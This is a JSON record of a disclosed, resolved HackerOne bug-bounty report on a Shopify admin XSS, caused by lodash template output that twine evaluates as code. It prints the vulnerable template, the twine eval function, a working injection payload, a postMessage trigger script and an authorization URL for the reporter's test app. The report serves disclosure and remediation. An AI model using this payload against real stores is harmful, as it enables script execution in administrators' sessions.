{
  "id": 217790,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTc3OTA=",
  "url": "https://hackerone.com/reports/217790",
  "title": "XSS in $shop$.myshopify.com/admin/ via twine template injection in \"Shopify.API.Modal.input\" method when using a malicious app",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2017-04-02T02:33:01.281Z",
  "submitted_at": "2017-04-02T02:33:01.281Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bored-engineer",
    "url": "/bored-engineer",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/xh0k94drzpd2d2z4bz9b1kbzngbh/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef?response-content-disposition=inline%3B%20filename%3D%22IMG_0330%20%25281%2529.jpg%22%3B%20filename%2A%3DUTF-8%27%27IMG_0330%2520%25281%2529.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUMDKYUIJ%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T220712Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCTBZ4h%2BEHBZSFfDHS5xw2lelyK3qXpIz0clJB%2BHBqcowIgGBBqxDbz0xnRKDGsVdESXdSniE%2BHBfV1rdO5eUFQnIwqsgUIGxADGgwwMTM2MTkyNzQ4NDkiDHxzkXQ%2BPax8qe0y9SqPBWkQfzyqj92jaUMU%2B5T6SPQ2kSj%2B59Aoadiw1gfHO1i4%2F0ccMTamoXifGiV3xIRAODWeznHuiZo5MFXs0eRE%2FeWKjui%2F%2FMMnnlP75Mx9RcCfX%2BAHTArOR285KOGZDt%2BZPNVnbkP2qBeLN0V6EMy9txjtwWdscus8dc%2FXgJhwDuj97m1BB9yGA3zN4LtWfNdFYbEczDLKRtZbzn1L4jODhFct25OSTftIczlOFeJpTNqo%2BerkSz1Ylt639JDBZAFG%2B%2F384F4y%2B3gW5MdI3fDFInGbZ6WQfrkWqAzqhHutrBUVNUAn%2FDqibJus5zz%2BVp%2BsRoO%2B7h7HWfMQQm7jTsgIsWUWfi5Xn0NW2RnXmmOyBV2i1w7RYPGh839tEAdmiEtNzRDGGDc1rXcvP%2Fnu0D4i535aNIsTVSYLWOXW1bkgSZr1%2BaWjQBOwB54d3ClcXzG8reuvJrc8leF4O5JWigxlkPT3RPzRKssEcfc8y8h0KIVRJUWqDiV16S%2FAzsyOlRAnBcw3QDVEV0Y18f8afe%2Br%2BH8V3inuEV0LwetfWCzmPI9EESVCpcy5jx0d%2FWQzGZMcKsiMd5iASh3In9hajQdjSBkjfKQQvdRTlMP8Rj509%2BVnpyqb8KfFCPpqZlxHq8w5hG7Jvh9JrqWnpnm33jxQeuCcE2l%2BO24C3DBFJzwdyKcMjfzW3EwoHrGT4Cc%2BPtsBeR9o3RkFcsPJnQe9lziaCDt4NcQx1THGqGSDv9RpUERKgDO2Grm2jmKot2zviBn%2FwgbBFPNaUyddeC%2BZ0saisluhOUGwj6f58TSWNmfQYEtDoMv31WIyx1LKCEv6%2FX6tfB3UZ6aL2E00tjrZeUw1tFdLTE1BKzL89eez2RcC9Tsw6v7AxgY6sQFRvZZktkF3WxdZ8vz5Fj5gKPwlIiZFUYyAsVF6aratdHjahABxDIpxl97ZWekaITd7DSQ5d6%2FjBbWSgz0HFU%2BQ12GVJrjW6E4LpVh8S%2Fr3p630NbeLs3%2FBQImwQmEOReIK9LFwI03BoYMjztPBX1hyMKznO0if%2FDqx9LlvfJwqhzk78xiZ1SGiQO1LPDxXUebXgOUKYHqNtfArYl0Mr8XgXTWDcrCtLVbnHyKjoGD%2FT9k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8b674e6f4f27eb6e3557acad43b648ca43036010e7a33a25e74f80dc8947597c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-06-01T16:42:17.056Z",
  "bug_reporter_agreed_on_going_public_at": "2017-06-01T16:42:17.009Z",
  "team_member_agreed_on_going_public_at": "2017-05-29T19:13:01.081Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "#Description\nThe Shopify [Embedded App SDK](https://help.shopify.com/api/sdks/merchant-apps/embedded-app-sdk) is used to facilitate limited interactions with parent page (`/admin/apps/$id`) from an embedded app within the shop admin interface. The SDK has multiple methods which allow an app to interact with the user which execute in the context of the admin domain and pass information back to the app. These UI elements are rendered from predefined templates using [lodash](https://lodash.com)'s [_.template](https://lodash.com/docs/4.17.4#template) method. While the method automatically provides input escaping the \"input\" template (used by the `Shopify.API.Modal.input` method) assigns a value to a special `data-define` attribute. While it's not possible to escape the attribute context, because the escaping is not fully context-aware it is possible to inject additional data into the attribute which is later interpreted by [twine](http://shopify.github.io/twine/). Because twine does not execute in a sandbox this template becomes an eval primitive and it possible to obtain XSS in the context of the parent application. \n\n#Technical Details\nWhen the `Shopify.API.Modal.input` method the following \"input\" template is rendered using [lodash](https://lodash.com)'s [_.template](https://lodash.com/docs/4.17.4#template) method: \n```html\n...\n<div class=\"ui-modal__body\" data-define=\"{typedInput: &#39;[%= value %]&#39;}\">\n...\n<label class=\"next-label\" for=\"text-a10e7047a92878fc20031f40da0b5231\"></label>\n<input type=\"text\" id=\"text-a10e7047a92878fc20031f40da0b5231\" data-bind=\"typedInput\" autofocus=\"autofocus\" class=\"next-input\" />\n...\n<button class=\"btn close-modal [%= buttonClass %]\" data-bind-event-click=\"closeModal({result: true, data: typedInput})\" type=\"button\" name=\"button\">[%= okButton %]</button>\n...\n```\nThe `typedInput` parameter is initialized from the `value` template parameter, bound to the text input, and finally used when the \"okButton\" is clicked. The data binding is handled by Shopify's [twine](http://shopify.github.io/twine/) JS library. Unfortunately because  [_.template](https://lodash.com/docs/4.17.4#template) is not fully context aware it will not provide JSON escaping for this parameter. For example if `value` is set to `some'value` the following invalid JSON will be created in the `data-define` attribute:\n```\n{typedInput: 'some'value'}\n```\nNormally this would just break the intended functionality, however if we analyze [twine](http://shopify.github.io/twine/) we can discover that this type of injection can actually result in arbitrary JS execution. Twine evaluates parameters using the (wrapFunctionString)[https://github.com/Shopify/twine/blob/24c4ccfccf5b50937e6d9e433676651549be1497/dist/twine.js#L373] method:\n```js\nwrapFunctionString = function(code, args, node) {\n  var e, error, keypath;\n  if (isKeypath(code) && (keypath = keypathForKey(node, code))) {\n    if (keypath[0] === '$root') {\n      return function($context, $root) {\n        return getValue($root, keypath);\n      };\n    } else {\n      return function($context, $root) {\n        return getValue($context, keypath);\n      };\n    }\n  } else {\n    code = \"return \" + code;\n    if (nodeArrayIndexes(node)) {\n      code = \"with($arrayPointers) { \" + code + \" }\";\n    }\n    if (requiresRegistry(args)) {\n      code = \"with($registry) { \" + code + \" }\";\n    }\n    try {\n      return new Function(args, \"with($context) { \" + code + \" }\");\n    } catch (error) {\n      e = error;\n      throw \"Twine error: Unable to create function on \" + node.nodeName + \" node with attributes \" + (stringifyNodeAttributes(node));\n    }\n  }\n};\n``` \nThe method wraps the attribute value in a [with](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/with) block to provide named variables and passes it to a [Function](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) constructor which acts as a eval primitive. This means any injection will result in JavaScript execution. For example, if the following data is used for the `value` template parameter it will flow as follows:\n```\n'-alert(document.domain)-'\n``` \nThis will result in a `data-define` attribute with the following value:\n```js\n{typedInput:''-document.domain-''}\n```\nThis will result in the following code executing within twine:\n```js\nwith($context) {\n  with($registry) {\n    return {typedInput: ''-alert(document.domain)-''}\n  }\n}\n```\nPutting this all together with the SDK we get the following script:\n```js\nwindow.parent.postMessage(JSON.stringify({\n  message: \"Shopify.API.Modal.input\",\n  data: {\n    message: {\n      message: \"\", \n      value: \"'-alert(document.domain)-'\",\n    }\n  }\n}), \"*\");\n```\n#Exploitability\nYou need to convince an administrator to authorize your malicious application, however the exploit does not require any specific permissions to trigger so an admin may be more willing to authorize the application. \n\n#Proof of Concept\nI've created an example malicious application associated with my partner account `shopify-whitehat-1@bored.engineer` to demonstrate the issue...\nOpen the following URL on on `$your-shop$.myshopify.com`:\n```\n/admin/oauth/authorize?client_id=5b7bd427b8caa69610bf85d1c87d4a04&scope=read_products&redirect_uri=https://attackerdoma.in/a4d76231-8657-48ed-8800-f1b02c7bb2ff.html&state=nonce\n```\nAfter authorizing the application an alert should appear on the `/admin` window containing `document.domain`.\n\n#Remediation\nThe \"input\" template should be updated to make the `value` parameter context-aware, perhaps wrapping in a `JSON.stringify` call.",
  "bounty_amount": "1000.0",
  "formatted_bounty": "$1,000",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 31,
  "voters": [
    "drsniper",
    "cdl",
    "bogdantc",
    "michiel",
    "dawgyg",
    "bl4de",
    "spam404",
    "gerben_javado",
    "harrymg",
    "glc",
    "and 21 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 4254,
      "category": "team",
      "content": "This report demonstrated an XSS that could be exploited by a malicious application installed on a store to execute javascript as a store administrator. The cause of the XSS turned out to be improperly escaped user input in a lodash template.",
      "updated_at": "2017-05-29T19:02:32.501Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 19168,
        "username": "francoischagnon",
        "name": "Francois Chagnon",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": "",
        "location": "",
        "created_at": "2015-03-19T21:06:55.673Z",
        "url": "https://hackerone.com/francoischagnon",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6NDQ3MSwicHVyIjoiYmxvYl9pZCJ9fQ==--5d363de94e2545bc9fc3f333250059f6ae61ed9f/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--cf3aeca803d1baf476958c689ca7b472a4cb54f1/2014-03-24.jpg"
        }
      }
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
